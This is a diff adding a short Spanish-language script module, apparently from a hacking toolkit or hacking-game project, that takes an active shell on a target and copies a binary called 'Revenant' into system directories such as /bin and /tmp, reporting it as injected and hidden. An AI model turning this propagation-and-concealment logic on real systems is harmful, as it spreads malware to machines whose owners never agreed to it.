@@ -1,0 +1,25 @@
+// modulos/inyeccion.nini - Propagación del Enjambre 💉
+
+tarea modulo_inyeccion_replicar:
+    si globals.objetivo_actual == null:
+        error("Fije un objetivo primero.")
+        retornar
+        
+    sesion = enjambre[globals.objetivo_actual]
+    si no sesion o typeof(sesion) != "shell":
+        error("Se requiere una shell activa para inyectar.")
+        retornar
+        
+    info("Inyectando Revenant en " + globals.objetivo_actual + "...")
+    
+    // Rutas de destino comunes
+    rutas = ["/bin", "/usr/bin", "/tmp", "/var", "/home/guest"]
+    
+    // Nini provee 'replicar_binario' que abstrae scp
+    recorrer rutas como r:
+        exito_inj = replicar_binario(sesion, r)
+        si exito_inj:
+            exito("Revenant inyectado y oculto en " + r)
+            retornar
+            
+    error("No se pudo inyectar el binario en ninguna ruta conocida.")
